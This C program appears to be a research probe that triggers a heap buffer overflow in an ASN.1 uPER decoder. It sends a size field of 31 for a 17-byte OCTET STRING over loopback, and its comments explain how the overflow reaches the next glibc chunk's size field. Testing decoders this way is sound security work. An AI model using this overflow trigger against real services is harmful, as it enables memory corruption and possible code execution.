/* Schema-variant consumer-reality probe: OCTET STRING (SIZE(0..17)).
 *
 * Generated Payload is { int nCount; byte arr[17]; }, sizeof == 24 with no
 * effective tail padding for the decoded length: the 5-bit size field can
 * decode 31, so 14 bytes land past arr[16].  A natural malloc(sizeof(Payload))
 * of 24 bytes exactly fills a glibc 32-byte chunk's 24 usable bytes, so the
 * overflow should reach the next chunk's size field at obj+24.
 *
 * All traffic is loopback-only (127.0.0.1).  Built against the same verbatim
 * pinned 4.6.0.17 runtime and pinned 4.7.0.1 compiler as the frontier harness.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <malloc.h>
#include "asn1crt_encoding.h"
#include "schema.h"

static void put_bits(unsigned char *buf, int *bitpos, unsigned value, int nbits)
{
    int i;
    for (i = nbits - 1; i >= 0; i--) {
        if ((value >> i) & 1)
            buf[*bitpos / 8] |= (unsigned char)(0x80 >> (*bitpos % 8));
        (*bitpos)++;
    }
}

static int read_full(int fd, unsigned char *buf, int n)
{
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

int main(int argc, char **argv)
{
    const char *role = argc > 1 ? argv[1] : "server";
    int port = argc > 2 ? atoi(argv[2]) : 39217;
    int count = argc > 3 ? atoi(argv[3]) : 31;
    int pattern = argc > 4 ? atoi(argv[4]) : 0;
    unsigned char wire[64], chosen[31];
    int bitpos = 0, wlen, i;
    unsigned char *p;
    size_t usable;

    /* Fill chosen bytes with two distinct alternating patterns. */
    for (i = 0; i < count; i++)
        chosen[i] = pattern ? (unsigned char)(i % 2 ? 0x5a : 0xa5)
                            : (unsigned char)(i % 2 ? 0xa5 : 0x5a);

    /* uPER: 5-bit size field (range 17), then count unaligned octets. */
    memset(wire, 0, sizeof(wire));
    put_bits(wire, &bitpos, (unsigned)count, 5);
    for (i = 0; i < count; i++)
        put_bits(wire, &bitpos, chosen[i], 8);
    wlen = (bitpos + 7) / 8;

    if (!strcmp(role, "client")) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        if (fd < 0) return 2;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (write(fd, wire, (size_t)wlen) != wlen) { close(fd); return 2; }
        close(fd);
        printf("client sent %d bytes count=%d pattern=%d\n", wlen, count, pattern);
        return 0;
    }

    {
        int lfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        int fd, yes = 1;
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (listen(lfd, 1) != 0) return 2;
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        close(lfd);
        if (read_full(fd, wire, wlen) != 0) { close(fd); return 2; }
        close(fd);
    }

    p = (unsigned char *)malloc(sizeof(Payload));
    if (!p) return 2;
    usable = malloc_usable_size(p);
    ((Payload *)p)->nCount = 0;
    memset(((Payload *)p)->arr, 0, 17);

    {
        BitStream bs;
        int err = -1;
        flag ok;
        BitStream_AttachBuffer(&bs, wire, (long)wlen);
        ok = Payload_Decode((Payload *)p, &bs, &err);
        printf("svc sizeof=%zu usable=%zu wlen=%d ok=%d err=%d decoded=%d\n",
               sizeof(Payload), usable, wlen, ok, err, ((Payload *)p)->nCount);
    }
    printf("object+0..15: ");
    for (i = 0; i < 16; i++) printf("%02x", p[i]);
    printf("\n");
    free(p);
    return 0;
}
